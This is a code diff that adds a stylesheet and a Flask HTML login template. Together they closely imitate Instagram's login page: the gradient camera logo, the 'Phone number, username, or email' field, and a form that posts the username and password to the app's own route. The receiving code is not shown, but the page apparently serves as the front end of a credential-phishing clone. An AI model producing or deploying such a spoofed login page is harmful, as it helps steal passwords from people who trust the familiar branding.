@@ -1,0 +1,136 @@
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    background: #fafafa;
+    font-family: Arial, Helvetica, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.login-card {
+    width: 350px;
+    padding: 45px 40px 40px;
+    background: white;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+}
+
+/* Instagram Gradient Logo Container */
+.camera-logo {
+    width: 60px;
+    height: 60px;
+    background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+    border-radius: 16px;
+    margin: 0 auto 30px;
+    position: relative;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+/* Outer Camera Outline */
+.camera-logo::before {
+    content: "";
+    width: 44px;
+    height: 44px;
+    border: 3.5px solid white;
+    border-radius: 12px;
+    position: absolute;
+}
+
+/* Center Lens */
+.camera-lens {
+    width: 22px;
+    height: 22px;
+    border: 3.5px solid white;
+    border-radius: 50%;
+    position: absolute;
+}
+
+/* Top-Right Flash Dot */
+.camera-dot {
+    width: 4.5px;
+    height: 4.5px;
+    background: white;
+    border-radius: 50%;
+    position: absolute;
+    top: 13px;
+    right: 13px;
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+}
+
+input {
+    width: 100%;
+    height: 40px;
+    padding: 10px;
+    border: 1px solid #dbdbdb;
+    border-radius: 5px;
+    background: #fafafa;
+    font-size: 12px;
+    outline: none;
+}
+
+input:focus {
+    border-color: #999;
+    background: white;
+}
+
+button {
+    width: 100%;
+    height: 36px;
+    margin-top: 8px;
+    border: none;
+    border-radius: 7px;
+    background: #2684ff;
+    color: white;
+    font-size: 14px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #1877e8;
+}
+
+@media (max-width: 450px) {
+    .login-card {
+        width: 100%;
+        border: none;
+        padding: 40px 30px;
+        background: #fafafa;
+    }
+}
+Login Template (templates/index.html)
+HTML
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="login-card">
+        <div class="camera-logo">
+            <div class="camera-lens"></div>
+            <div class="camera-dot"></div>
+        </div>
+        <form action="/" method="POST">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
